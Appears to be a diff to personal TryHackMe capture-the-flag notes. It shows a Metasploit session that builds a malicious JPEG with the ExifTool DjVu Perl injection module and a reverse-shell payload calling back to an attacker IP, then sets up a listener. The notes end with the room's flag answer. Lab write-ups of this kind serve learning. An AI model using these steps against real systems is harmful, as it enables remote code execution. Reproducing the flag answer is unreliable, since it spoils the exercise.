@@ -442,3 +442,448 @@ Matching Modules
    -  ----                                                      ---------------  ----       -----  -----------
    0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
    1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/gitlab_exif_rce
+```
+```text
+msf6 > use 0
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
+[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options
+
+Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.jpg          yes       Output file
+
+Payload options (cmd/unix/python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   JPEG file
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lhost 10.18.1.77
+lhost => 10.18.1.77
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
+
+[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ls -la
+total 24156
+drwxr-xr-x 40 kali kali     4096 Sep 21 13:53 .
+drwxr-xr-x  3 root root     4096 May 12 11:52 ..
+drwxr-xr-x  3 kali kali     4096 Sep  9 13:09 .armitage
+-rw-r--r--  1 kali kali     2450 Sep  9 22:36 .armitage.prop
+drwxr-xr-x  2 kali kali     4096 Sep  9 13:08 armitage-tmp
+drwxr-xr-x  2 kali kali     4096 Sep 16 16:32 asm
+-rw-r--r--  1 kali kali      157 Aug 24 21:23 .bash_history
+-rw-r--r--  1 kali kali      220 May 12 11:52 .bash_logout
+-rw-r--r--  1 kali kali     5551 Sep 13 14:11 .bashrc
+-rw-r--r--  1 kali kali     3526 May 12 11:52 .bashrc.original
+-rw-r--r--  1 kali kali   425351 Aug 31 12:45 book.txt
+drwx------  6 kali kali     4096 Aug 22 00:48 .BurpSuite
+drwx------ 26 kali kali     4096 Sep 11 12:32 .cache
+drwxr-xr-x  2 kali kali     4096 Sep 19 12:15 chill_hack
+-rw-r--r--  1 kali kali     1078 Sep 10 15:22 clinic.lst
+drwxr-xr-x  7 kali kali     4096 Aug  6 17:57 .cme
+drwxr-xr-x  5 kali kali     4096 Sep 19 16:48 confidential
+drwxr-xr-x 23 kali kali     4096 Sep 17 22:40 .config
+drwxr-xr-x  2 kali kali     4096 Sep 17 20:22 cred_harv
+-rw-r--r--  1 kali kali      243 Sep 10 13:26 crunch.txt
+drwx------  3 kali kali     4096 Sep 11 12:32 .dbus
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Desktop
+-rw-r--r--  1 kali kali  6638061 Sep 10 16:07 dict2.lst
+-rw-r--r--  1 kali kali   278600 Sep 10 15:59 dict.lst
+-rw-r--r--  1 kali kali       35 May 12 14:59 .dmrc
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Documents
+drwxr-xr-x 62 kali kali     4096 Sep 19 16:55 Downloads
+-rw-r--r--  1 kali kali    11759 May 12 11:52 .face
+-rw-r--r--  1 kali kali    11759 Jul 26 20:40 .face.dpkg-new
+lrwxrwxrwx  1 kali kali        5 May 12 11:52 .face.icon -> .face
+-rw-r--r--  1 kali kali       18 Sep 20  2021 ftp_flag.txt
+drwx------  3 kali kali     4096 Sep 19 14:54 .gnupg
+-rw-r--r--  1 kali kali       33 Aug 12 23:28 hashctf2
+-rw-------  1 kali kali        0 May 12 12:19 .ICEauthority
+drwxr-xr-x  2 kali kali     4096 Sep 11 11:46 IDS_IPS_evasion
+-rw-------  1 kali kali       51 Jul 15 22:52 .irb_history
+drwxr-xr-x  4 kali kali     4096 Jul 18 12:20 .java
+drwx------  2 kali kali     4096 Sep 19 14:58 .john
+-rw-------  1 kali kali       20 Sep 10 20:17 .lesshst
+drwx------  7 kali kali     4096 Aug  3 18:48 .local
+drwx------  5 kali kali     4096 Jul 15 13:33 .mozilla
+drwxr-xr-x 10 kali kali     4096 Jul 25 14:46 .msf4
+-rw-r--r--  1 kali kali     3757 Jul 30 18:54 multi_launcher
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Music
+-rw-------  1 kali kali      221 Aug 19 19:49 .mysql_history
+-rw-------  1 kali kali     2906 Aug 23 13:10 .nc_history
+drwxr-xr-x  2 kali kali     4096 Sep 17 18:15 obfus
+drwxr-xr-x  2 kali kali     4096 Sep 16 13:06 payloads
+drwxr-xr-x  2 kali kali     4096 Sep 17 13:38 Pictures
+drwx------  3 kali kali     4096 Jul 29 13:23 .pki
+drwxr-xr-x  3 kali kali     4096 Sep 10 11:50 powercat
+drwxr-xr-x  4 kali kali     4096 Sep 11 00:16 PowerLessShell
+-rw-r--r--  1 kali kali      807 May 12 11:52 .profile
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Public
+-rw-------  1 kali kali       55 Sep 16 20:20 .python_history
+drwxr-xr-x  3 kali kali     4096 Aug  4 13:19 .recon-ng
+-rw-------  1 kali kali       78 Jul 19 20:47 .rediscli_history
+-rw-r--r--  1 kali kali    61440 Sep 11 13:58 sam.bak
+drwxr-xr-x  2 kali kali     4096 Sep 11 10:04 sandox_learning
+drwxr-xr-x  2 kali kali     4096 Sep 17 20:51 share
+drwxr-xr-x  4 kali kali     4096 Sep 10 21:21 snmpcheck
+drwx------  2 kali kali     4096 Sep 19 17:17 .ssh
+-rw-r--r--  1 root root      256 Jul 29 18:10 stager2.bat
+drwxr-xr-x  4 kali kali     4096 Aug 20 16:27 Sublist3r
+-rw-r--r--  1 kali kali        0 May 12 12:25 .sudo_as_admin_successful
+-rw-r--r--  1 kali kali 16826368 Sep 11 13:57 system.bak
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Templates
+-rw-r--r--  1 kali kali       37 Sep 10 16:24 usernames-list.txt
+drwxr-xr-x  2 kali kali     4096 May 12 12:19 Videos
+-rw-r--r--  1 kali kali      215 Aug 28 14:22 .wget-hsts
+drwxr-xr-x  3 kali kali     4096 Aug  5 13:59 .wpscan
+-rw-------  1 kali kali       49 Sep 21 12:33 .Xauthority
+-rw-------  1 kali kali    19303 Sep 21 13:52 .xsession-errors
+-rw-------  1 kali kali    11602 Sep 19 18:47 .xsession-errors.old
+-rw-r--r--  1 kali kali    76973 Sep 19 18:47 .zsh_history
+-rw-r--r--  1 kali kali    80410 Aug 30 00:00 .zsh_history_bad
+-rw-r--r--  1 kali kali    10877 Sep 13 14:11 .zshrc
+-rw-r--r--  1 kali kali    10877 Jul 26 20:40 .zshrc.dpkg-new
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cd .msf4
+```
+```text
+┌──(kali㉿kali)-[~/.msf4]
+└─$ ls -la
+total 52
+drwxr-xr-x 10 kali kali 4096 Jul 25 14:46 .
+drwxr-xr-x 40 kali kali 4096 Sep 21 13:53 ..
+drwxr-xr-x  2 kali kali 4096 Jul 15 13:48 data
+-rw-r--r--  1 kali kali  206 Sep 19 16:05 history
+drwxr-xr-x  2 kali kali 4096 Sep 21 13:52 local
+drwxr-xr-x  2 kali kali 4096 Jul 15 13:48 logos
+drwxr-xr-x  4 kali kali 4096 Aug 10 14:18 logs
+drwxr-xr-x  2 kali kali 4096 Aug 24 14:13 loot
+-rw-r--r--  1 kali kali 7129 Sep 11 00:21 meterpreter_history
+drwxr-xr-x  2 kali kali 4096 Jul 15 13:48 modules
+drwxr-xr-x  2 kali kali 4096 Jul 15 13:48 plugins
+drwxr-xr-x  2 kali kali 4096 Jul 15 13:48 store
+```
+```text
+┌──(kali㉿kali)-[~/.msf4]
+└─$ cd local
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/local]
+└─$ ls -la
+total 12
+drwxr-xr-x  2 kali kali 4096 Sep 21 13:52 .
+drwxr-xr-x 10 kali kali 4096 Jul 25 14:46 ..
+-rw-r--r--  1 kali kali 2573 Sep 21 13:52 msf.jpg
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mkdir exiftool
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ 1.pdf                                       learning_smtp
+ 46635.py                                    learning_uploadvuln
+ 47887.py                                    learning_wireshark
+ alice_key                                   Lian_Yu
+ ascii_art                                   LinEnum.sh
+ backdoors                                   linpeas.sh
+ BinaryHeaven                                malicioso.png
+ biohazard                                   mal_strings
+ Blockchain                                  Market_Place
+ bountyhacker                                mysql_bakup_20191129023059-1.5.1.sql
+ break_out_cage                              NAX
+ buildscript.sh                              nikto
+ burp_learning                               OverlayFS
+ CCT2019                                     overpass2.pcapng
+ Chankro                                     overpass.go
+ chocolate_factory                           pass.lst
+ C_hooking                                   PHishing
+ cracking.txt                                PRET
+ credential.pgp                              priv.key
+ cupp                                        PurgeIrrelevantData_1826.ps1
+ CustomerDetails.xlsx                        pwnkit
+ CustomerDetails.xlsx.gpg                    request.txt
+ cyborg                                      responder_ntlm_hash
+ DDOS                                        reverse.exe
+ Devservice.exe                              reverse.msi
+ dirtyPipes                                  robert_ssh.txt
+ DNS_MANIPUL                                 SAM
+ download.dat                                shadow.txt
+ download.dat2                               share
+ downloads                                   SharpGPOAbuse
+ easypeasy                                   SharpGPOAbuse.exe
+ Enterprise                                  shell.php5
+ exiftool                                    smb
+ exploit                                     smb2
+ exploit_commerce.py                         smb_learning
+ ferox-http_10_10_4_54_-1660495668.state     socat
+ ferox-http_10_10_95_128_-1660676223.state   solar_log4j
+ fuelcms_exploit.py                          Spring4shell
+'GCONV_PATH=.'                               starkiller-1.10.0.AppImage
+ Ghostcat-CNVD-2020-10487                    startup.bat
+ Git_Happens                                 stats.db
+ google-chrome-stable_current_amd64.deb      steel_mountain
+ hacked                                      system.txt
+ hash                                        tcp_learning
+ hashes.asreproast                           teaParty
+ hashes.txt                                  telnet_learning
+ hash.txt                                    tryhackme.asc
+ header.txt                                  user.lst
+ hydra.rsa                                   username_generator
+ ICS_plant                                   user.png
+ id_rsa                                      users.db
+ id_rsa_robert                               walrus_and_the_carpenter.py
+ index.html                                  WindowsForensicsCheatsheetTryHackMe.pdf
+ key                                         Windows_priv
+ KIBA                                        Witty
+ learning_crypto                            'WittyAle(1).ovpn'
+ learning_kerberos                           WittyAle.ovpn
+ learning_metasploit                         WordPress_CVE202129447
+ learning_nfs                                year_rabbit
+ learning_nmap                               zerologon_learning
+ learning_shell
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cp /home/kali/.msf4/local/msf.jpg msf.jpg
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ 1.pdf                                       learning_smtp
+ 46635.py                                    learning_uploadvuln
+ 47887.py                                    learning_wireshark
+ alice_key                                   Lian_Yu
+ ascii_art                                   LinEnum.sh
+ backdoors                                   linpeas.sh
+ BinaryHeaven                                malicioso.png
+ biohazard                                   mal_strings
+ Blockchain                                  Market_Place
+ bountyhacker                                msf.jpg
+ break_out_cage                              mysql_bakup_20191129023059-1.5.1.sql
+ buildscript.sh                              NAX
+ burp_learning                               nikto
+ CCT2019                                     OverlayFS
+ Chankro                                     overpass2.pcapng
+ chocolate_factory                           overpass.go
+ C_hooking                                   pass.lst
+ cracking.txt                                PHishing
+ credential.pgp                              PRET
+ cupp                                        priv.key
+ CustomerDetails.xlsx                        PurgeIrrelevantData_1826.ps1
+ CustomerDetails.xlsx.gpg                    pwnkit
+ cyborg                                      request.txt
+ DDOS                                        responder_ntlm_hash
+ Devservice.exe                              reverse.exe
+ dirtyPipes                                  reverse.msi
+ DNS_MANIPUL                                 robert_ssh.txt
+ download.dat                                SAM
+ download.dat2                               shadow.txt
+ downloads                                   share
+ easypeasy                                   SharpGPOAbuse
+ Enterprise                                  SharpGPOAbuse.exe
+ exiftool                                    shell.php5
+ exploit                                     smb
+ exploit_commerce.py                         smb2
+ ferox-http_10_10_4_54_-1660495668.state     smb_learning
+ ferox-http_10_10_95_128_-1660676223.state   socat
+ fuelcms_exploit.py                          solar_log4j
+'GCONV_PATH=.'                               Spring4shell
+ Ghostcat-CNVD-2020-10487                    starkiller-1.10.0.AppImage
+ Git_Happens                                 startup.bat
+ google-chrome-stable_current_amd64.deb      stats.db
+ hacked                                      steel_mountain
+ hash                                        system.txt
+ hashes.asreproast                           tcp_learning
+ hashes.txt                                  teaParty
+ hash.txt                                    telnet_learning
+ header.txt                                  tryhackme.asc
+ hydra.rsa                                   user.lst
+ ICS_plant                                   username_generator
+ id_rsa                                      user.png
+ id_rsa_robert                               users.db
+ index.html                                  walrus_and_the_carpenter.py
+ key                                         WindowsForensicsCheatsheetTryHackMe.pdf
+ KIBA                                        Windows_priv
+ learning_crypto                             Witty
+ learning_kerberos                          'WittyAle(1).ovpn'
+ learning_metasploit                         WittyAle.ovpn
+ learning_nfs                                WordPress_CVE202129447
+ learning_nmap                               year_rabbit
+ learning_shell                              zerologon_learning
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mv msf.jpg /home/kali/Downloads/exiftool
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd exiftool
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/exiftool]
+└─$ ls
+msf.jpg
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ searchsploit exiftool          
+------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                           |  Path
+------------------------------------------------------------------------- ---------------------------------
+ExifTool 12.23 - Arbitrary Code Execution                                | linux/local/50911.py
+------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ msfconsole -q
+```
+```text
+msf6 > search exiftool
+
+Matching Modules
+================
+```
+```text
+#  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
+   1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/gitlab_exif_rce
+```
+```text
+msf6 > use 0
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
+[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options
+
+Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.jpg          yes       Output file
+
+Payload options (cmd/unix/python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.253.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   JPEG file
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lhost 10.18.1.77
+lhost => 10.18.1.77
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
+
+[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
+```
+```text
+msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set payload cmd/unix/reverse_netcat
+payload => cmd/unix/reverse_netcat
+```
+```text
+msf6 exploit(multi/handler) > set lgots 10.18.1.77
+lgots => 10.18.1.77
+```
+```text
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(multi/handler) > run
+
+[-] Msf::OptionValidateError The following options failed to validate: LHOST
+[*] Exploit completed, but no session was created.
+```
+```text
+msf6 exploit(multi/handler) > set lhost 10.18.1.77
+lhost => 10.18.1.77
+```
+```text
+msf6 exploit(multi/handler) > run
+
+[-] Handler failed to bind to 10.18.1.77:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+[*] Exploit completed, but no session was created.
+```
+```text
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.18.1.77:4444
+
+For some reason cannot get rev shell, maybe for version metasploit, now start attack box
+nope
+```
+Generate an image payload with Metasploit
+Get code execution on the target machine
+Retrieve the flag located in /home/dogpics/user.txt. What is the user flag?
+*dejavu{735c0553063625f41879e57d5b4f3352}*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d96207dd832c106398e2267/room-content/03100fff977a5fb2c6c2c4cc3b82a241.png)
+
+## Notes / Lessons Learned
+[[Dig Dug]]
+
